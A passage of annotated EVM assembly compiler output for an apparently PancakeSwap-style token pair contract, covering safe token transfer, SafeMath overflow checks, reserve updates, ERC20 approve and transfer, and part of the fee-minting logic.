value) */\n      swap3\n        /* \"src/Pair.sol\":1703:1780  token.call(... */\n      swap2\n      dup3\n      swap2\n        /* \"--CODEGEN--\":25:43   */\n      swap1\n        /* \"src/Pair.sol\":1703:1780  token.call(... */\n      dup1\n      dup4\n        /* \"--CODEGEN--\":25:43   */\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_316:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_318\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_316)\n    tag_318:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"src/Pair.sol\":1703:1780  token.call(... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":14:15   */\n      dup1\n        /* \"--CODEGEN--\":21:22   */\n      0x00\n        /* \"--CODEGEN--\":16:47   */\n      dup2\n      eq\n      tag_320\n      jumpi\n        /* \"--CODEGEN--\":75:79   */\n      0x40\n        /* \"--CODEGEN--\":69:80   */\n      mload\n        /* \"--CODEGEN--\":64:80   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":144:148   */\n      0x1f\n        /* \"--CODEGEN--\":140:149   */\n      not\n        /* \"--CODEGEN--\":133:137   */\n      0x3f\n        /* \"--CODEGEN--\":115:131   */\n      returndatasize\n        /* \"--CODEGEN--\":111:138   */\n      add\n        /* \"--CODEGEN--\":107:150   */\n      and\n        /* \"--CODEGEN--\":104:105   */\n      dup3\n        /* \"--CODEGEN--\":100:151   */\n      add\n        /* \"--CODEGEN--\":94:98   */\n      0x40\n        /* \"--CODEGEN--\":87:152   */\n      mstore\n        /* \"--CODEGEN--\":169:185   */\n      returndatasize\n        /* \"--CODEGEN--\":166:167   */\n      dup3\n        /* \"--CODEGEN--\":159:186   */\n      mstore\n        /* \"--CODEGEN--\":225:241   */\n      returndatasize\n        /* \"--CODEGEN--\":222:223   */\n      0x00\n        /* \"--CODEGEN--\":215:219   */\n      0x20\n        /* \"--CODEGEN--\":212:213   */\n      dup5\n        /* \"--CODEGEN--\":208:220   */\n      add\n        /* \"--CODEGEN--\":193:242   */\n      returndatacopy\n        /* \"--CODEGEN--\":7:249   */\n      jump(tag_319)\n        /* \"--CODEGEN--\":16:47   */\n    tag_320:\n        /* \"--CODEGEN--\":36:40   */\n      0x60\n        /* \"--CODEGEN--\":31:40   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":7:249   */\n    tag_319:\n      pop\n        /* \"src/Pair.sol\":1667:1780  (bool success, bytes memory data) = token.call(... */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"src/Pair.sol\":1811:1818  success */\n      dup2\n        /* \"src/Pair.sol\":1811:1868  success && (data.length == 0 || abi.decode(data, (bool))) */\n      dup1\n      iszero\n      tag_322\n      jumpi\n      pop\n        /* \"src/Pair.sol\":1823:1834  data.length */\n      dup1\n      mload\n        /* \"src/Pair.sol\":1823:1839  data.length == 0 */\n      iszero\n      dup1\n        /* \"src/Pair.sol\":1823:1867  data.length == 0 || abi.decode(data, (bool)) */\n      tag_322\n      jumpi\n      pop\n        /* \"src/Pair.sol\":1854:1858  data */\n      dup1\n        /* \"src/Pair.sol\":1843:1867  abi.decode(data, (bool)) */\n      dup1\n      0x20\n      add\n      swap1\n      mload\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_323\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_323:\n      pop\n        /* \"src/Pair.sol\":1843:1867  abi.decode(data, (bool)) */\n      mload\n        /* \"src/Pair.sol\":1823:1867  data.length == 0 || abi.decode(data, (bool)) */\n    tag_322:\n        /* \"src/Pair.sol\":1790:1918  require(... */\n      tag_324\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x18\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a205452414e534645525f4641494c45440000000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_324:\n        /* \"src/Pair.sol\":1587:1925  function _safeTransfer(address token, address to, uint value) private {... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/SafeMath.sol\":481:630  function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_168:\n        /* \"src/SafeMath.sol\":539:548  uint256 z */\n      0x00\n        /* \"src/SafeMath.sol\":568:574  y == 0 */\n      dup2\n      iszero\n      dup1\n        /* \"src/SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n      tag_326\n      jumpi\n      pop\n      pop\n        /* \"src/SafeMath.sol\":583:588  x * y */\n      dup1\n      dup3\n      mul\n        /* \"src/SafeMath.sol\":597:598  x */\n      dup3\n        /* \"src/SafeMath.sol\":592:593  y */\n      dup3\n        /* \"src/SafeMath.sol\":583:588  x * y */\n      dup3\n        /* \"src/SafeMath.sol\":592:593  y */\n      dup2\n        /* \"src/SafeMath.sol\":578:593  (z = x * y) / y */\n      tag_327\n      jumpi\n      invalid\n    tag_327:\n      div\n        /* \"src/SafeMath.sol\":578:598  (z = x * y) / y == x */\n      eq\n        /* \"src/SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n    tag_326:\n        /* \"src/SafeMath.sol\":560:623  require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6d756c2d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_170:\n        /* \"src/SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"src/SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"src/SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/Pair.sol\":2834:3817  function _update(... */\n    tag_179:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":2996:3019  balance0 <= uint112(-1) */\n      dup5\n      gt\n      dup1\n      iszero\n      swap1\n        /* \"src/Pair.sol\":2996:3046  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n      tag_332\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":3023:3046  balance1 <= uint112(-1) */\n      dup4\n      gt\n      iszero\n        /* \"src/Pair.sol\":2996:3046  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n    tag_332:\n        /* \"src/Pair.sol\":2975:3089  require(... */\n      tag_333\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x11\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x78, 0x50616e63616b653a204f564552464c4f57)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_333:\n        /* \"src/Pair.sol\":3204:3222  blockTimestampLast */\n      sload(0x0b)\n        /* \"src/Pair.sol\":3130:3155  block.timestamp % 2 ** 32 */\n      0xffffffff\n        /* \"src/Pair.sol\":3130:3145  block.timestamp */\n      timestamp\n        /* \"src/Pair.sol\":3130:3155  block.timestamp % 2 ** 32 */\n      dup2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"src/Pair.sol\":3204:3222  blockTimestampLast */\n      swap1\n      div\n      dup2\n      and\n        /* \"src/Pair.sol\":3187:3222  blockTimestamp - blockTimestampLast */\n      dup3\n      sub\n      swap1\n        /* \"src/Pair.sol\":3259:3274  timeElapsed > 0 */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/Pair.sol\":3259:3292  timeElapsed > 0 && _reserve0 != 0 */\n      tag_335\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":3278:3292  _reserve0 != 0 */\n      dup5\n      and\n      iszero\n      iszero\n        /* \"src/Pair.sol\":3259:3292  timeElapsed > 0 && _reserve0 != 0 */\n    tag_335:\n        /* \"src/Pair.sol\":3259:3310  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n      dup1\n      iszero\n      tag_336\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":3296:3310  _reserve1 != 0 */\n      dup4\n      and\n      iszero\n      iszero\n        /* \"src/Pair.sol\":3259:3310  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n    tag_336:\n        /* \"src/Pair.sol\":3255:3651  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n      iszero\n      tag_337\n      jumpi\n        /* \"src/Pair.sol\":3495:3506  timeElapsed */\n      dup1\n        /* \"src/Pair.sol\":3426:3506  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      0xffffffff\n      and\n        /* \"src/Pair.sol\":3431:3475  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      tag_338\n        /* \"src/Pair.sol\":3465:3474  _reserve0 */\n      dup6\n        /* \"src/Pair.sol\":3431:3458  UQ112x112.encode(_reserve1) */\n      tag_339\n        /* \"src/Pair.sol\":3448:3457  _reserve1 */\n      dup7\n        /* \"src/Pair.sol\":3431:3447  UQ112x112.encode */\n      tag_340\n        /* \"src/Pair.sol\":3431:3458  UQ112x112.encode(_reserve1) */\n      jump\t// in\n    tag_339:\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/Pair.sol\":3431:3464  UQ112x112.encode(_reserve1).uqdiv */\n      and\n      swap1\n        /* \"src/Pair.sol\":3431:3475  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      0xffffffff\n        /* \"src/Pair.sol\":3431:3464  UQ112x112.encode(_reserve1).uqdiv */\n      tag_341\n        /* \"src/Pair.sol\":3431:3475  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      and\n      jump\t// in\n    tag_338:\n        /* \"src/Pair.sol\":3386:3406  price0CumulativeLast */\n      0x0c\n        /* \"src/Pair.sol\":3386:3506  price0CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/Pair.sol\":3426:3476  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"src/Pair.sol\":3426:3506  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"src/Pair.sol\":3386:3506  price0CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"src/Pair.sol\":3560:3640  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      0xffffffff\n      dup2\n      and\n        /* \"src/Pair.sol\":3565:3609  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n      tag_342\n        /* \"src/Pair.sol\":3599:3608  _reserve1 */\n      dup5\n        /* \"src/Pair.sol\":3565:3592  UQ112x112.encode(_reserve0) */\n      tag_339\n        /* \"src/Pair.sol\":3582:3591  _reserve0 */\n      dup8\n        /* \"src/Pair.sol\":3565:3581  UQ112x112.encode */\n      tag_340\n        /* \"src/Pair.sol\":3565:3592  UQ112x112.encode(_reserve0) */\n      jump\t// in\n        /* \"src/Pair.sol\":3565:3609  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n    tag_342:\n        /* \"src/Pair.sol\":3520:3540  price1CumulativeLast */\n      0x0d\n        /* \"src/Pair.sol\":3520:3640  price1CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/Pair.sol\":3560:3610  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"src/Pair.sol\":3560:3640  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"src/Pair.sol\":3520:3640  price1CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"src/Pair.sol\":3255:3651  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n    tag_337:\n        /* \"src/Pair.sol\":3660:3668  reserve0 */\n      0x0b\n        /* \"src/Pair.sol\":3660:3688  reserve0 = uint112(balance0) */\n      dup1\n      sload\n      not(0xffffffffffffffffffffffffffff)\n      and\n      sub(shl(0x70, 0x01), 0x01)\n      dup9\n      dup2\n      and\n      swap2\n      swap1\n      swap2\n      or\n      not(shl(0x70, 0xffffffffffffffffffffffffffff))\n        /* \"src/Pair.sol\":3698:3726  reserve1 = uint112(balance1) */\n      and\n      shl(0x70, 0x01)\n      dup9\n      dup4\n      and\n      dup2\n      mul\n      swap2\n      swap1\n      swap2\n      or\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/Pair.sol\":3736:3771  blockTimestampLast = blockTimestamp */\n      and\n      shl(0xe0, 0x01)\n      0xffffffff\n      dup8\n      and\n      mul\n      or\n      swap3\n      dup4\n      swap1\n      sstore\n        /* \"src/Pair.sol\":3786:3810  Sync(reserve0, reserve1) */\n      0x40\n      dup1\n      mload\n        /* \"src/Pair.sol\":3791:3799  reserve0 */\n      dup5\n      dup5\n      and\n        /* \"src/Pair.sol\":3786:3810  Sync(reserve0, reserve1) */\n      dup2\n      mstore\n        /* \"src/Pair.sol\":3801:3809  reserve1 */\n      swap2\n      swap1\n      swap4\n      div\n      swap1\n      swap2\n      and\n        /* \"src/Pair.sol\":3786:3810  Sync(reserve0, reserve1) */\n      0x20\n      dup3\n      add\n      mstore\n      dup2\n      mload\n      0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1\n      swap3\n      swap2\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log1\n        /* \"src/Pair.sol\":2834:3817  function _update(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_183:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2493:2509  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2493:2502  allowance */\n      0x02\n        /* \"src/ERC20.sol\":2493:2509  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":2493:2518  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":2493:2526  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"src/ERC20.sol\":2541:2572  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n    tag_190:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2681:2696  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2681:2690  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2681:2696  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      tag_346\n      swap1\n        /* \"src/ERC20.sol\":2701:2706  value */\n      dup3\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2681:2700  balanceOf[from].sub */\n      tag_170\n        /* \"src/ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_346:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2663:2678  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2663:2672  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2663:2678  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"src/ERC20.sol\":2663:2707  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"src/ERC20.sol\":2733:2746  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      tag_347\n      swap1\n        /* \"src/ERC20.sol\":2751:2756  value */\n      dup3\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/ERC20.sol\":2733:2750  balanceOf[to].add */\n      tag_348\n        /* \"src/ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_347:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":2717:2726  balanceOf */\n      0x01\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":2717:2757  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"src/ERC20.sol\":2717:2730  balanceOf[to] */\n      swap2\n      swap4\n        /* \"src/ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"src/ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/Pair.sol\":3903:4796  function _mintFee(... */\n    tag_204:\n        /* \"src/Pair.sol\":3998:4008  bool feeOn */\n      0x00\n        /* \"src/Pair.sol\":4020:4033  address feeTo */\n      dup1\n        /* \"src/Pair.sol\":4045:4052  factory */\n      0x07\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":4036:4059  IFactory(factory).feeTo */\n      and\n      0x017e7e58\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_350\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_350:\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_351\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_351:\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_352\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_352:\n      pop\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      mload\n        /* \"src/Pair.sol\":4122:4127  kLast */\n      sload(0x0e)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":4079:4098  feeTo != address(0) */\n      dup3\n      and\n      iszero\n      dup1\n      iszero\n      swap5\n      pop\n        /* \"src/Pair.sol\":4036:4061  IFactory(factory).feeTo() */\n      swap2\n      swap3\n      pop\n        /* \"src/Pair.sol\":4122:4127  kLast */\n      swap1\n        /* \"src/Pair.sol\":4152:4790  if (feeOn) {... */\n      tag_353\n      jumpi\n        /* \"src/Pair.sol\":4181:4192  _kLast != 0 */\n      dup1\n      iszero\n        /* \"src/Pair.sol\":4177:4723  if (_kLast != 0) {... */\n      tag_354\n      jumpi\n        /* \"src/Pair.sol\":4212:4222  uint rootK */\n      0x00\n        /* \"src/Pair.sol\":4225:4266  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      tag_355\n        /* \"src/Pair.sol\":4235:4265  uint(_reserve0).mul(_reserve1) */\n      tag_208\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":4235:4250  uint(_reserve0) */\n      dup9\n      dup2\n      and\n      swap1\n        /* \"src/Pair.sol\":4235:4265  uint(_reserve0).mul(_reserve1) */\n      dup9\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":4235:4254  uint(_reserve0).mul */\n      tag_168\n        /* \"src/Pair.sol\":4235:4265  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":4225:4266  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n    tag_355:\n        /* \"src/Pair.sol\":4212:4266  uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":4284:4298  uint rootKLast */\n      0x00\n        /* \"src/Pair.sol\":4301:4318  Math.sqrt(_kLast) */\n      tag_357\n        /* \"src/Pair.sol\":4311:4317  _kLast */\n      dup4\n        /* \"src/Pair.sol\":4301:4310  Math.sqrt */\n      tag_209\n        /* \"src/Pair.sol\":4301:4318  Math.sqrt(_kLast) */\n      jump\t// in\n    tag_357:\n        /* \"src/Pair.sol\":4284:4318  uint rootKLast = Math.sqrt(_kLast) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":4348:4357  rootKLast */\n      dup1\n        /* \"src/Pair.sol\":4340:4345  rootK */\n      dup3\n        /* \"src/Pair.sol\":4340:4357  rootK > rootKLast */\n      gt\n        /* \"src/Pair.sol\":4336:4709  if (rootK > rootKLast) {... */\n      iszero\n      tag_358\n      jumpi\n        /* \"src/Pair.sol\":4381:4395  uint numerator */\n      0x00\n        /* \"src/Pair.sol\":4398:4488  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      tag_359\n        /* \"src/Pair.sol\":4465:4466  8 */\n      0x08\n        /* \"src/Pair.sol\":4398:4435  totalSupply.mul(rootK.sub(rootKLast)) */\n      tag_175\n        /* \"src/Pair.sol\":4414:4434  rootK.sub(rootKLast) */\n      tag_361\n        /* \"src/Pair.sol\":4414:4419  rootK */\n      dup7\n        /* \"src/Pair.sol\":4424:4433  rootKLast */\n      dup7\n        /* \"src/Pair.sol\":4414:4434  rootK.sub(rootKLast) */\n      0xffffffff\n        /* \"src/Pair.sol\":4414:4423  rootK.sub */\n      tag_170\n        /* \"src/Pair.sol\":4414:4434  rootK.sub(rootKLast) */\n      and\n      jump\t// in\n    tag_361:\n        /* \"src/Pair.sol\":4398:4409  totalSupply */\n      sload(0x00)\n      swap1\n        /* \"src/Pair.sol\":4398:4435  totalSupply.mul(rootK.sub(rootKLast)) */\n      0xffffffff\n        /* \"src/Pair.sol\":4398:4413  totalSupply.mul */\n      tag_168\n        /* \"src/Pair.sol\":4398:4435  totalSupply.mul(rootK.sub(rootKLast)) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":4398:4488  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n    tag_359:\n        /* \"src/Pair.sol\":4381:4488  uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":4510:4526  uint denominator */\n      0x00\n        /* \"src/Pair.sol\":4529:4564  rootK.mul(17).add(rootKLast.mul(8)) */\n      tag_362\n        /* \"src/Pair.sol\":4547:4563  rootKLast.mul(8) */\n      tag_363\n        /* \"src/Pair.sol\":4547:4556  rootKLast */\n      dup5\n        /* \"src/Pair.sol\":4561:4562  8 */\n      0x08\n        /* \"src/Pair.sol\":4547:4563  rootKLast.mul(8) */\n      0xffffffff\n        /* \"src/Pair.sol\":4547:4560  rootKLast.mul */\n      tag_168\n        /* \"src/Pair.sol\":4547:4563  rootKLast.mul(8) */\n      and\n      jump\t// in\n    tag_363:\n        /* \"src/Pair.sol\":4529:4542  rootK.mul(17) */\n      tag_364\n        /* \"src/Pair.sol\":4529:4534  rootK */\n      dup7\n        /* \"src/Pair.sol\":4539:4541  17 